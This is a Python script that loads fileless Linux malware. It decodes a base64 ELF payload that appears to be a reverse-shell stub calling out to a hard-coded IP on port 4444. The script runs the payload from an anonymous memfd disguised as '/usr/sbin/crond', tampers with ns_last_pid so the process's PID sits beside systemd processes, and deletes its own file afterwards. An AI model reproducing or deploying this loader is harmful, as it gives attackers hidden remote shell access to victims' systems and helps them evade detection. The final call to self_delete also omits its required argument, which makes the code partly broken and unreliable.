#!/usr/bin/python
import os, sys, ctypes, base64, subprocess


# TODO add zlib decompression to the elf file 


 # Run the ps command to get the list of running processes along with their command lines
ps_output = subprocess.check_output(["ps", "-e", "-o", "pid,cmd"])

# Split the output into lines and extract the PIDs and command lines
process_info = {}


def blend_pid(pid):
    if os.path.exists("/proc/sys/kernel/ns_last_pid"):
        print("[+] Found /proc/sys/kernel/ns_last_pid")
        capture_pid = subprocess.check_output(["cat", "/proc/sys/kernel/ns_last_pid"])
        print("[+] Last PID started:", capture_pid.decode().strip())

        # Write the new PID to /proc/sys/kernel/ns_last_pid
        # change_pid = subprocess.run(["echo", str(pid)], stdout=subprocess.PIPE)
        with open("/proc/sys/kernel/ns_last_pid", "w+") as ns_last_pid_file:
            ns_last_pid_file.write(str(pid))
        print(f"[+] Change PID: {capture_pid.decode().strip()} --> {pid}")
        os.system("cat /proc/sys/kernel/ns_last_pid")
        load()
        # Revert back to the captured PID
        # change_back = subprocess.run(["echo", capture_pid.decode().strip()], stdout=subprocess.PIPE)
        with open("/proc/sys/kernel/ns_last_pid", "w") as ns_last_pid_file:
            ns_last_pid_file.write(capture_pid.decode().strip())
        print(f"[+] Changed back PID: {pid} --> {capture_pid.decode().strip()}")
        return 0
        
       
def assert_safe_pid(pid):
    range_search = [x for x in range(pid+1, pid+20, 1)]
    # print(range_search)
    for i in range_search:
        if i not in [x for x in process_info.keys()]:
            # print(f"[+] Didnt find {i}")
            blend_pid(int(i))
            return 0
    # print([x for x in process_info.keys()])
    return -1



def find_pid():
    for line in ps_output.decode().splitlines()[1:]:
        pid, cmdline = line.strip().split(maxsplit=1)
        process_info[int(pid)] = cmdline

    for pid, cmd in process_info.items():
        if "/lib/systemd/systemd --user" in cmd or "/lib/systemd/systemd-journald" in cmd or "/lib/systemd/systemd-logind" in cmd:
            print(f"[+] Found {pid}, {cmd} to blend with...")
            print(f" Safe pid: {int(pid)//2}")
            assert_safe_pid(int(pid)//2)
            return 0
    return -1


def check_command_existence(cmd):
    """
    Verifies that a given command exists on the machine.
    :param cmd: The command whose existence we want to check.
    :return: True if the command is present on the system, False otherwise.
    """
    output = os.system("command -v %s >/dev/null" % cmd)
    if int(output) == 0:
        return 0
    else:
        return 1

def assert_memfd_py3():
    result = os.system("python3 -c \"import ctypes;print(ctypes.CDLL(None).syscall(319, '', 0))\"")
    if int(result) == -1:
        raise RuntimeError("[!] The remote kernel doesn't support the create_memfd syscall!")
        sys.exit(1)


def self_delete(script_name):
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print(f"[+] Script '{script_path}' has been self-deleted.")
    except Exception as e:
        print(f"[!] Error during self-deletion: {e}")


def load():

    p = 'f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgARXMCoD6xRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g=='

    fd = ctypes.CDLL(None).syscall(319, "kthread", 0)
    os.write(fd, base64.b64decode(p))
    arguments = ['/usr/sbin/crond -f']
    try:
        # need to find a better child process to blend as 
        pid = os.fork()
        if pid > 0:
            print("[+] Child process PID --> %i" % pid)
        else:
            #os.setsid()
            print("[+] /proc/self/fd/%i --> %s" % (fd, arguments))
            # print("[+] /proc/self/fd/%i -->" %fd, arguments)
            os.execv("/proc/self/fd/%i" % fd, arguments)
            return 0
    except Exception as e:
        print("[!] Execution failed (%s)!" % str(e))
        return -1



if __name__ == '__main__':
    
    if check_command_existence("python3") == 0:
        print("[+] Python3 detecting...proceeding")
        assert_memfd_py3()
        find_pid()

        #load()
        self_delete()
        sys.exit(2)
    else: 
        raise RuntimeError("[!] Python3 is not present on the machine!")
